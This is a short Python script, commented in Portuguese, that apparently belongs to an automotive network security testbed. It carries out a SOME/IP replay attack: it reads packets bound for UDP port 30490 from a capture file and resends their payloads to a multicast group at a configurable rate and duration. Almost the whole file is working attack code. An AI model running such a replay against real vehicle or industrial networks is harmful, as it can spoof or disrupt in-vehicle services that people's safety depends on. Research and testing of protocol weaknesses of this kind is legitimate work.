"""
Replay attack — reenvia pacotes de um PCAP capturado anteriormente.
"""

import socket
import time

from someip_network.network import MULTICAST_GROUP, MULTICAST_PORT

try:
    from scapy.all import rdpcap, UDP
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


def run(pcap_path: str, rate_hz=50, duration_s=30):
    if not HAS_SCAPY:
        raise RuntimeError('scapy nao instalado: pip install scapy')

    pkts     = rdpcap(pcap_path)
    someip   = [p for p in pkts if UDP in p and p[UDP].dport == 30490]
    print(f'[Replay] {len(someip)} pacotes SOME/IP carregados de {pcap_path}')

    sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    interval = 1.0 / rate_hz
    deadline = time.time() + duration_s
    sent     = 0
    idx      = 0

    while time.time() < deadline:
        pkt = someip[idx % len(someip)]
        sock.sendto(bytes(pkt[UDP].payload), (MULTICAST_GROUP, MULTICAST_PORT))
        sent += 1
        idx  += 1
        time.sleep(interval)

    sock.close()
    print(f'[Replay] Encerrado — {sent} pacotes reenviados')


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('pcap',                          help='Caminho do PCAP')
    p.add_argument('--rate',     type=int, default=50)
    p.add_argument('--duration', type=int, default=30)
    args = p.parse_args()
    run(args.pcap, args.rate, args.duration)
